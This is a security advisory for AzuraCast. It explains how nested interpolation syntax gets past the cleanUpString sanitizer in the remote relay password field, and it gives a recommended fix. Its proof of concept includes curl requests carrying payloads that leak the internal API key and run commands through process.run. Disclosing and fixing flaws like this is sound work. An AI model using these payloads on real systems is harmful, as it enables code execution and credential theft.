# [H] AzuraCast Vulnerable to Liquidsoap Code Injection via Incomplete cleanUpString-to-toRawString Migration in Remote Relay Password Field

## Summary
Severity: High
Advisory: GHSA-q4ph-8x8g-95f8
CWE: CWE-94
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-q4ph-8x8g-95f8
Type: github-advisory

## Affected
- Packagist: `azuracast/azuracast` — affected >=0 <0.23.6

## Details
## Summary

The `cleanUpString()` method in `ConfigWriter.php` uses an ungreedy regex to strip Liquidsoap string interpolation patterns (`#{...}`) from user input. This regex can be bypassed via nested interpolation syntax (`#{#{EXPR}}`), allowing injection of arbitrary Liquidsoap code. Commit `ff49ef4` migrated most user-controlled fields to the safe `toRawString()` method but left the remote relay password field using the vulnerable `cleanUpString()`. A user with the `RemoteRelays` station permission can achieve arbitrary code execution in the Liquidsoap process, leak internal API keys, or disrupt station operation.

## Details

### The Vulnerable Sanitizer

`cleanUpString()` at `backend/src/Radio/Backend/Liquidsoap/ConfigWriter.php:1349-1367`:

```php
public static function cleanUpString(?string $string): string
{
    $string = str_replace(['"', "\n", "\r"], ['\'', '', ''], $string ?? '');

    // Remove strings that are interpolated
    $string = preg_replace(
        '/#{(.*)}/U',   // Ungreedy: matches minimum chars to first }
        '$1',
        $string
    );

    $string = preg_replace(
        '/\$\((.*)\)/U',
        '$1',
        $string ?? ''
    );

    return $string ?? '';
}
```

The `/U` (ungreedy) flag causes `.*` to match the **minimum** characters until the first `}`. With nested input `#{#{EXPR}}`:

1. Regex finds `#{` at position 0
2. Ungreedy `.*` matches `#{EXPR` (stops at the **first** `}`)
3. Full match consumed: `#{#{EXPR}` — replacement with capture group `$1` yields: `#{EXPR`
4. The trailing `}` is appended by the regex engine (it was outside the match)
5. **Final result: `#{EXPR}`** — a valid Liquidsoap string interpolation expression

### The Incomplete Patch

Commit `ff49ef4` ("Use raw strings for user-input strings to avoid interpolation", 2026-03-06) correctly migrated host, username, mount, name, description, genre, and URL fields to `toRawString()`. However, the password field was left using `cleanUpString()`:

`ConfigWriter.php:1208-1215`:
```php
$password = self::cleanUpString($source->password);  // Still vulnerable

$adapterType = $source->adapterType;
if (FrontendAdapters::Shoutcast === $adapterType) {
    $password .= ':#' . $id;
}

$outputParams[] = 'password = "' . $password . '"';  // Double-quoted = interpolated
```

The password is embedded in a Liquidsoap **double-quoted string**, which evaluates `#{...}` interpolation expressions.

### Why toRawString() Is Safe

`toRawString()` uses Liquidsoap raw string delimiters (`{str_xxxxx|...|str_xxxxx}`) which **do not perform interpolation**, making them immune to this attack class.

### The Input Path

1. Attacker sends `PUT /api/station/{station_id}/remote/{id}` with `source_password` containing the nested payload
2. Entity setter truncates to 100 chars via `mb_substr` (payloads fit within this limit)
3. No validation on password content
4. On station config regeneration, `ConfigWriter::getOutputString()` calls `cleanUpString()` on the password
5. Bypass produces valid interpolation, embedded in double-quoted Liquidsoap string
6. Liquidsoap evaluates the interpolation when loading the config

## PoC

### Step 1: API Key Disclosure (38 chars)

```bash
# Set malicious password on an existing remote relay
curl -X PUT "http://azuracast.local/api/station/1/remote/1" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"source_password": "#{#{settings.azuracast.api_key()}}"}'
```

After `cleanUpString()` processing, the password becomes `#{settings.azuracast.api_key()}`.

When Liquidsoap loads the config, the generated line:
```
password = "#{settings.azuracast.api_key()}"
```
evaluates to the internal API key value, which is then sent as the password to the remote relay server — observable by the attacker if they control the relay endpoint.

### Step 2: Remote Code Execution (54 chars)

```bash
# RCE payload using string.char() to bypass quote filtering
curl -X PUT "http://azuracast.local/api/station/1/remote/1" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"source_password": "#{#{process.run(string.char(105)^string.char(100))}}"}'
```

After processing: `#{process.run(string.char(105)^string.char(100))}` → executes `id` command.

`string.char()` and the `^` concatenation operator are used to build the command string without double quotes (which `cleanUpString` replaces with single quotes, and Liquidsoap doesn't support single-quoted strings).

### Step 3: Trigger config regeneration

Restart the station or modify any station setting to force Liquidsoap config regeneration. The payload executes when Liquidsoap loads the new config.

The same bypass works with `$($(EXPR))` via the second regex `/\$\((.*)\)/U`.

## Impact

- **Arbitrary code execution** within the Liquidsoap process container via `process.run()`
- **Internal API key disclosure** via `settings.azuracast.api_key()`, granting the attacker full internal API access to the station
- **File read/write** within the Liquidsoap container via Liquidsoap's file operations
- **Station disruption** — malicious config can crash the Liquidsoap process
- **Low privilege bar** — requires only the `RemoteRelays` station permission, not global admin

## Recommended Fix

Replace `cleanUpString()` with `toRawString()` for the password field, consistent with the fix applied to all other fields in commit `ff49ef4`. The Shoutcast suffix append needs adjustment to work with raw strings:

```php
// Before (vulnerable):
$password = self::cleanUpString($source->password);
$adapterType = $source->adapterType;
if (FrontendAdapters::Shoutcast === $adapterType) {
    $password .= ':#' . $id;
}
$outputParams[] = 'password = "' . $password . '"';

// After (safe):
$password = $source->password ?? '';
$adapterType = $source->adapterType;
if (FrontendAdapters::Shoutcast === $adapterType) {
    $password .= ':#' . $id;
}
$outputParams[] = 'password = ' . self::toRawString($password);
```

This uses the raw string delimiter which prevents all interpolation, matching the approach already used for host, username, mount, and all other user-controlled fields.

Additionally, consider removing `cleanUpString()` entirely or marking it as deprecated, since `toRawString()` is the correct approach for all Liquidsoap string values. Any remaining callers should be migrated.

## References
- https://github.com/AzuraCast/AzuraCast/security/advisories/GHSA-q4ph-8x8g-95f8
- https://github.com/AzuraCast/AzuraCast/commit/d6b8422fc2c36269df9d1adec89dfbba58828915
- https://github.com/AzuraCast/AzuraCast
